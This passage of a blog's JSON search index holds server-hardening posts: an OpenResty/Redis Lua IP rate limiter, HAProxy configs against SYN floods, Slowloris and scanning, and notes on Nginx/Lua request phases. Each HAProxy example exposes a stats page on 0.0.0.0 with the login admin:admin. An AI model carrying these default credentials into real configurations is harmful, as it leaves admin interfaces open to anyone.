style=\"display:flex;\"\u003e\u003cspan\u003e        ngx.exit(ngx.OK)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e ttl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e         \u003cspan style=\"color:#75715e\"\u003e-- 监测周期（秒）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e bktimes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e     \u003cspan style=\"color:#75715e\"\u003e-- 在监测周期内达到触发拦截的访问量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e block_ttl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e600\u003c/span\u003e  \u003cspan style=\"color:#75715e\"\u003e-- 触发拦截后拦截时间（秒）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e ip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ngx.var.remote_addr\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e ipvtimes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e client:get(ip)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e ipvtimes \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e ipvtimes \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-1\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e-- blocked\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e ngx.exit(\u003cspan style=\"color:#ae81ff\"\u003e403\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e last_ttl \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e client:ttl(ip)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e-- ngx.say(\u0026#34;key exist.ttl is \u0026#34;, last_ttl)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e last_ttl \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            client:set(ip, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            client:expire(ip, ttl)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e-- ngx.say(\u0026#34;ttl \u0026amp; vtimes recount\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e ngx.exit(ngx.OK)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e vtimes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e tonumber(client:get(ip)) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e vtimes \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e bktimes \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            client:set(ip, vtimes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            client:expire(ip, last_ttl)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e-- ngx.say(ip, \u0026#34; view \u0026#34;, vtimes, \u0026#34; times\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e ngx.exit(ngx.OK)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e-- ngx.say(ip, \u0026#34; will be block next time.\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            client:set(ip, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            client:expire(ip, block_ttl)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e ngx.exit(ngx.OK)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e-- key does not exist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    client:set(ip, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e-- ngx.say(ip, \u0026#34; view 1 times\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    client:expire(ip, ttl)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e ngx.exit(ngx.OK)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","OpenResty","Redis","Lua"],"title":"openresty+redis拦截高频访问IP"},{"categories":["URL","Terraform"],"contents":" [Terraform] 入門學習筆記 ","date":"June 26, 2019","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190626-terraform-getting-started/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://godleon.github.io/blog/DevOps/terraform-getting-started/\" target=\"_blank\" rel=\"noopener\"\u003e[Terraform] 入門學習筆記\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Terraform"],"title":"[Terraform] 入門學習筆記"},{"categories":["URL","HAProxy"],"contents":" 設定 Haproxy 以防止 DDOS 攻擊 TCP syn flood attacks vi /etc/sysctl.conf # Protection from SYN flood net.ipv4.tcp_syncookies = 1 net.ipv4.conf.all.rp_filter = 1 net.ipv4.tcp_max_syn_backlog = 1024 Slowloris like attacks defaults option http-server-close timeout http-request 5s timeout connect 5s timeout client 30s timeout server 10s timeout tunnel 1h 限制每一個 user 的連線數量 普通用戶瀏覽網站的網頁，或是從網站下載東西時，瀏覽器一般會建立 5-7 個 TCP 鏈接。當一個惡意 client 打開了大量 TCP 連線時，耗費大量資源，因此我們必須要限制同一個用戶的連線數量。\n但如果有很多使用者，是從某一個私有網段，透過 NAT 的方式連線到 Server 時，且實際上我們也不知道，到底哪一個會是 NAT 的轉址後的 IP，不知道該將哪個 IP 設定為白名單，這樣的限制就會造成問題，因此我們認為實際的環境，這樣的設定應該要保留不處理。\n以下是一個設定的範例，最重要的地方是在 frontend ft_web 區塊的設定。\nglobal stats socket ./haproxy.stats level admin defaults option http-server-close mode http timeout http-request 5s timeout connect 5s timeout server 10s timeout client 30s listen stats bind 0.0.0.0:8880 stats enable stats hide-version stats uri / stats realm HAProxy Statistics stats auth admin:admin frontend ft_web bind 0.0.0.0:8080 # Table definition stick-table type ip size 100k expire 30s store conn_cur # Allow clean known IPs to bypass the filter tcp-request connection accept if { src -f /etc/haproxy/whitelist.lst } # Shut the new connection as long as the client has already 10 opened tcp-request connection reject if { src_conn_cur ge 10 } tcp-request connection track-sc1 src # Split static and dynamic traffic since these requests have different impacts on the servers use_backend bk_web_static if { path_end .jpg .png .gif .css .js } default_backend bk_web # Dynamic part of the application backend bk_web balance roundrobin cookie MYSRV insert indirect nocache server srv1 192.168.1.2:80 check cookie srv1 maxconn 100 server srv2 192.168.1.3:80 check cookie srv2 maxconn 100 # Static objects backend bk_web_static balance roundrobin server srv1 192.168.1.2:80 check maxconn 1000 server srv2 192.168.1.3:80 check maxconn 1000 限制每個 user 產生新連線的速率 Limiting the connection rate per user 惡意的使用者會在短時間內建立很多連線，但如果產生新連線的速度太高，就會消耗掉過多的資源服務一個使用者。\n因為 browser 有可能在幾秒鐘內，建立 7 個 TCP Connection，所以基本上認定如果在 3 秒鐘內，建立了超過 20 個 TCP Connection，就有可能是惡意的 client。\n但如果有很多使用者，是從某一個私有網段，透過 NAT 的方式連線到 Server 時，且實際上我們也不知道，到底哪一個會是 NAT 的轉址後的 IP，不知道該將哪個 IP 設定為白名單，這樣的限制就會造成問題，因此我們認為實際的環境，這樣的設定應該要保留不處理。\nfrontend ft_web bind 0.0.0.0:8080 # Table definition stick-table type ip size 100k expire 30s store conn_rate(3s) # Allow clean known IPs to bypass the filter tcp-request connection accept if { src -f /etc/haproxy/whitelist.lst } # Shut the new connection as long as the client has already 10 opened # tcp-request connection reject if { src_conn_cur ge 10 } tcp-request connection track-sc1 src # Split static and dynamic traffic since these requests have different impacts on the servers use_backend bk_web_static if { path_end .jpg .png .gif .css .js } default_backend bk_web 限制產生 HTTP request 的速度 Limiting the HTTP request rate global stats socket ./haproxy.stats level admin defaults option http-server-close mode http timeout http-request 5s timeout connect 5s timeout server 10s timeout client 30s listen stats bind 0.0.0.0:8880 stats enable stats hide-version stats uri / stats realm HAProxy Statistics stats auth admin:admin frontend ft_web bind 0.0.0.0:8080 # Use General Purpose Couter (gpc) 0 in SC1 as a global abuse counter # Monitors the number of request sent by an IP over a period of 10 seconds stick-table type ip size 1m expire 10s store gpc0,http_req_rate(10s) tcp-request connection track-sc1 src tcp-request connection reject if { src_get_gpc0 gt 0 } # Split static and dynamic traffic since these requests have different impacts on the servers use_backend bk_web_static if { path_end .jpg .png .gif .css .js } default_backend bk_web # Dynamic part of the application backend bk_web balance roundrobin cookie MYSRV insert indirect nocache # If the source IP sent 10 or more http request over the defined period, # flag the IP as abuser on the frontend acl abuse src_http_req_rate(ft_web) ge 10 acl flag_abuser src_inc_gpc0(ft_web) tcp-request content reject if abuse flag_abuser server srv1 192.168.1.2:80 check cookie srv1 maxconn 100 server srv2 192.168.1.3:80 check cookie srv2 maxconn 100 # Static objects backend bk_web_static balance roundrobin server srv1 192.168.1.2:80 check maxconn 1000 server srv2 192.168.1.3:80 check maxconn 1000 偵測弱點掃描 Detecting vulnerability scans 如果有人進行弱點掃描，在 Server 通常會遇到以下這些錯誤訊息：\ninvalid and truncated requests denied or tarpitted requests failed authentications 4xx error pages global stats socket ./haproxy.stats level admin defaults option http-server-close mode http timeout http-request 5s timeout connect 5s timeout server 10s timeout client 30s listen stats bind 0.0.0.0:8880 stats enable stats hide-version stats uri / stats realm HAProxy Statistics stats auth admin:admin frontend ft_web bind 0.0.0.0:8080 # Use General Purpose Couter 0 in SC1 as a global abuse counter # Monitors the number of errors generated by an IP over a period of 10 seconds stick-table type ip size 1m expire 10s store gpc0,http_err_rate(10s) tcp-request connection track-sc1 src tcp-request connection reject if { src_get_gpc0 gt 0 } # Split static and dynamic traffic since these requests have different impacts on the servers use_backend bk_web_static if { path_end .jpg .png .gif .css .js } default_backend bk_web # Dynamic part of the application backend bk_web balance roundrobin cookie MYSRV insert indirect nocache # If the source IP generated 10 or more http request over the defined period, # flag the IP as abuser on the frontend acl abuse src_http_err_rate(ft_web) ge 10 acl flag_abuser src_inc_gpc0(ft_web) tcp-request content reject if abuse flag_abuser server srv1 192.168.1.2:80 check cookie srv1 maxconn 100 server srv2 192.168.1.3:80 check cookie srv2 maxconn 100 # Static objects backend bk_web_static balance roundrobin server srv1 192.168.1.2:80 check maxconn 1000 server srv2 192.168.1.3:80 check maxconn 1000 ","date":"June 17, 2019","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190617-haproxy-ddos/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.maxkit.com.tw/2016/05/haproxy-ddos.html\" target=\"_blank\" rel=\"noopener\"\u003e設定 Haproxy 以防止 DDOS 攻擊\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tcp-syn-flood-attacks\"\u003eTCP syn flood attacks\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evi /etc/sysctl.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Protection from SYN flood\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.tcp_syncookies \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.conf.all.rp_filter \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.tcp_max_syn_backlog \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"slowloris-like-attacks\"\u003eSlowloris like attacks\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003edefaults\n     option      http-server-close\n     timeout     http-request 5s\n     timeout     connect 5s\n     timeout     client 30s\n     timeout     server 10s\n     timeout     tunnel 1h\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"限制每一個-user-的連線數量\"\u003e限制每一個 user 的連線數量\u003c/h3\u003e\n\u003cp\u003e普通用戶瀏覽網站的網頁，或是從網站下載東西時，瀏覽器一般會建立 5-7 個 TCP 鏈接。當一個惡意 client 打開了大量 TCP 連線時，耗費大量資源，因此我們必須要限制同一個用戶的連線數量。\u003c/p\u003e\n\u003cp\u003e但如果有很多使用者，是從某一個私有網段，透過 NAT 的方式連線到 Server 時，且實際上我們也不知道，到底哪一個會是 NAT 的轉址後的 IP，不知道該將哪個 IP 設定為白名單，這樣的限制就會造成問題，因此我們認為實際的環境，這樣的設定應該要保留不處理。\u003c/p\u003e\n\u003cp\u003e以下是一個設定的範例，最重要的地方是在 frontend ft_web 區塊的設定。\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eglobal\n  stats socket ./haproxy.stats level admin\n\ndefaults\n  option http-server-close\n  mode http\n  timeout http-request 5s\n  timeout connect 5s\n  timeout server 10s\n  timeout client 30s\n\nlisten stats\n  bind 0.0.0.0:8880\n  stats enable\n  stats hide-version\n  stats uri     /\n  stats realm   HAProxy Statistics\n  stats auth    admin:admin\n\nfrontend ft_web\n  bind 0.0.0.0:8080\n\n  # Table definition\n  stick-table type ip size 100k expire 30s store conn_cur\n\n  # Allow clean known IPs to bypass the filter\n  tcp-request connection accept if { src -f /etc/haproxy/whitelist.lst }\n  # Shut the new connection as long as the client has already 10 opened\n  tcp-request connection reject if { src_conn_cur ge 10 }\n  tcp-request connection track-sc1 src\n\n  # Split static and dynamic traffic since these requests have different impacts on the servers\n  use_backend bk_web_static if { path_end .jpg .png .gif .css .js }\n\n  default_backend bk_web\n\n# Dynamic part of the application\nbackend bk_web\n  balance roundrobin\n  cookie MYSRV insert indirect nocache\n  server srv1 192.168.1.2:80 check cookie srv1 maxconn 100\n  server srv2 192.168.1.3:80 check cookie srv2 maxconn 100\n\n# Static objects\nbackend bk_web_static\n  balance roundrobin\n  server srv1 192.168.1.2:80 check maxconn 1000\n  server srv2 192.168.1.3:80 check maxconn 1000\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"限制每個-user-產生新連線的速率-limiting-the-connection-rate-per-user\"\u003e限制每個 user 產生新連線的速率 Limiting the connection rate per user\u003c/h3\u003e\n\u003cp\u003e惡意的使用者會在短時間內建立很多連線，但如果產生新連線的速度太高，就會消耗掉過多的資源服務一個使用者。\u003c/p\u003e","tags":["URL","HAProxy"],"title":"設定 Haproxy 以防止 DDOS 攻擊"},{"categories":["URL","Kubernetes"],"contents":" 白话 Kubernetes Runtime ","date":"June 13, 2019","hero":"/images/hero/kubernetes.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190613-k8s-runtime/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=Mzg5Mjc3MjIyMA==\u0026amp;mid=2247543594\u0026amp;idx=1\u0026amp;sn=9083cff79ca7f5fb9d6fee08d1144989\u0026amp;source=41\u0026amp;poc_token=HL8MZmmjq-HF5O8fHC711sGwSQ1O9OuO5hGLL_px\" target=\"_blank\" rel=\"noopener\"\u003e白话 Kubernetes Runtime\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Kubernetes"],"title":"白话 Kubernetes Runtime"},{"categories":["URL","Nginx"],"contents":" Nginx 请求处理流程你了解吗？ 11 个处理阶段 1）NGX_HTTP_POST_READ_PHASE：\n接收到完整的 HTTP 头部后处理的阶段，它位于 uri 重写之前，实际上很少有模块会注册在该阶段，默认的情况下，该阶段被跳过。\n2）NGX_HTTP_SERVER_REWRITE_PHASE：\nURI 与 location 匹配前，修改 URI 的阶段，用于重定向，也就是该阶段执行处于 server 块内，location 块外的重写指令，在读取请求头的过程中 nginx 会根据 host 及端口找到对应的虚拟主机配置。\n3）NGX_HTTP_FIND_CONFIG_PHASE：\n根据 URI 寻找匹配的 location 块配置项阶段，该阶段使用重写之后的 uri 来查找对应的 location，值得注意的是该阶段可能会被执行多次，因为也可能有 location 级别的重写指令。\n4）NGX_HTTP_REWRITE_PHASE：\n上一阶段找到 location 块后再修改 URI，location 级别的 uri 重写阶段，该阶段执行 location 基本的重写指令，也可能会被执行多次。\n5）NGX_HTTP_POST_REWRITE_PHASE：\n防止重写 URL 后导致的死循环，location 级别重写的后一阶段，用来检查上阶段是否有 uri 重写，并根据结果跳转到合适的阶段。\n6）NGX_HTTP_PREACCESS_PHASE：\n下一阶段之前的准备，访问权限控制的前一阶段，该阶段在权限控制阶段之前，一般也用于访问控制，比如限制访问频率，链接数等。\n7）NGX_HTTP_ACCESS_PHASE：\n让 HTTP 模块判断是否允许这个请求进入 Nginx 服务器，访问权限控制阶段，比如基于 ip 黑白名单的权限控制，基于用户名密码的权限控制等。\n8）NGX_HTTP_POST_ACCESS_PHASE：\n访问权限控制的后一阶段，该阶段根据权限控制阶段的执行结果进行相应处理，向用户发送拒绝服务的错误码，用来响应上一阶段的拒绝。\n9）NGX_HTTP_TRY_FILES_PHASE：\n为访问静态文件资源而设置，try_files 指令的处理阶段，如果没有配置 try_files 指令，则该阶段被跳过。\n10）NGX_HTTP_CONTENT_PHASE：\n处理 HTTP 请求内容的阶段，大部分 HTTP 模块介入这个阶段，内容生成阶段，该阶段产生响应，并发送到客户端。\n11）NGX_HTTP_LOG_PHASE：\n处理完请求后的日志记录阶段，该阶段记录访问日志。\n以上 11 个阶段中，HTTP 无法介入的阶段有 4 个：\n3）NGX_HTTP_FIND_CONFIG_PHASE\n5）NGX_HTTP_POST_REWRITE_PHASE\n8）NGX_HTTP_POST_ACCESS_PHASE\n9）NGX_HTTP_TRY_FILES_PHASE\n剩余的 7 个阶段，HTTP 模块均能介入，每个阶段可介入模块的个数也是没有限制的，多个 HTTP 模块可同时介入同一阶段并作用于同一请求。\nlua 8 个阶段 init_by_lua http set_by_lua server, server if, location, location if rewrite_by_lua http, server, location, location if access_by_lua http, server, location, location if content_by_lua location, location if header_filter_by_lua http, server, location, location if body_filter_by_lua http, server, location, location if log_by_lua http, server, location, location if\n1）init_by_lua：\n在 nginx 重新加载配置文件时，运行里面 lua 脚本，常用于全局变量的申请。（例如：lua_shared_dict 共享内存的申请，只有当 nginx 重起后，共享内存数据才清空，这常用于统计。）\n2）set_by_lua：\n流程分支处理判断变量初始化（设置一个变量，常用与计算一个逻辑，然后返回结果，该阶段不能运行 Output API、Control API、Subrequest API、Cosocket API）\n3）rewrite_by_lua：\n转发、重定向、缓存等功能 (例如特定请求代理到外网，在 access 阶段前运行，主要用于 rewrite)\n4）access_by_lua：\nIP 准入、接口权限等情况集中处理(例如配合 iptable 完成简单防火墙，主要用于访问控制，能收集到大部分变量，类似 status 需要在 log 阶段才有。这条指令运行于 nginx access 阶段的末尾，因此总是在 allow 和 deny 这样的指令之后运行，虽然它们同属 access 阶段。）\n5）content_by_lua：\n内容生成，阶段是所有请求处理阶段中最为重要的一个，运行在这个阶段的配置指令一般都肩负着生成内容（content）并输出 HTTP 响应。\n6）header_filter_by_lua：\n应答 HTTP 过滤处理，一般只用于设置 Cookie 和 Headers 等，该阶段不能运行 Output API、Control API、Subrequest API、Cosocket API(例如添加头部信息)。\n7）body_filter_by_lua：\n应答 BODY 过滤处理(例如完成应答内容统一成大写)（一般会在一次请求中被调用多次, 因为这是实现基于 HTTP 1.1 chunked 编码的所谓\u0026quot;流式输出\u0026quot;的，该阶段不能运行 Output API、Control API、Subrequest API、Cosocket API）\n8）log_by_lua：\n会话完成后本地异步完成日志记录(日志可以记录在本地，还可以同步到其他机器)（该阶段总是运行在请求结束的时候，用于请求的后续操作，如在共享内存中进行统计数据,如果要高精确的数据统计，应该使用 body_filter_by_lua，该阶段不能运行 Output API、Control API、Subrequest API、Cosocket API）\nnginx 和 lua 运行阶段的对应关系 1）init_by_lua，运行在 initialization Phase；\n2）set_by_lua，运行在 rewrite 阶段；\nset 指令来自 ngx_rewrite 模块，运行于 rewrite 阶段； 3）rewrite_by_lua 指令来自 ngx_lua 模块，运行于 rewrite 阶段的末尾\n4）access_by_lua 指令同样来自 ngx_lua 模块，运行于 access 阶段的末尾；\ndeny 指令来自 ngx_access 模块，运行于 access 阶段； 5）content_by_lua 指令来自 ngx_lua 模块，运行于 content 阶段；不要将它和其它的内容处理指令在同一个 location 内使用如 proxy_pass；\necho 指令则来自 ngx_echo 模块，运行在 content 阶段； 6）header_filter_by_lua 运行于 content 阶段，output-header-filter 一般用来设置 cookie 和 headers；\n7）body_filter_by_lua，运行于 content 阶段；\n8）log_by_lua，运行在 Log Phase 阶段；\n","date":"March 7, 2019","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2019/20190307-nginx/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/otQIhuLABU3omOLtRfJnZQ\" target=\"_blank\" rel=\"noopener\"\u003eNginx 请求处理流程你了解吗？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"11-个处理阶段\"\u003e11 个处理阶段\u003c/h3\u003e\n\u003cp\u003e1）NGX_HTTP_POST_READ_PHASE：\u003c/p\u003e\n\u003cp\u003e接收到完整的 HTTP 头部后处理的阶段，它位于 uri 重写之前，实际上很少有模块会注册在该阶段，默认的情况下，该阶段被跳过。\u003c/p\u003e\n\u003cp\u003e2）NGX_HTTP_SERVER_REWRITE_PHASE：\u003c/p\u003e\n\u003cp\u003eURI 与 location 匹配前，修改 URI 的阶段，用于重定向，也就是该阶段执行处于 server 块内，location 块外的重写指令，在读取请求头的过程中 nginx 会根据 host 及端口找到对应的虚拟主机配置。\u003c/p\u003e\n\u003cp\u003e3）NGX_HTTP_FIND_CONFIG_PHASE：\u003c/p\u003e\n\u003cp\u003e根据 URI 寻找匹配的 location 块配置项阶段，该阶段使用重写之后的 uri 来查找对应的 location，值得注意的是该阶段可能会被执行多次，因为也可能有 location 级别的重写指令。\u003c/p\u003e\n\u003cp\u003e4）NGX_HTTP_REWRITE_PHASE：\u003c/p\u003e\n\u003cp\u003e上一阶段找到 location 块后再修改 URI，location 级别的 uri 重写阶段，该阶段执行 location 基本的重写指令，也可能会被执行多次。\u003c/p\u003e\n\u003cp\u003e5）NGX_HTTP_POST_REWRITE_PHASE：\u003c/p\u003e\n\u003cp\u003e防止重写 URL 后导致的死循环，location 级别重写的后一阶段，用来检查上阶段是否有 uri 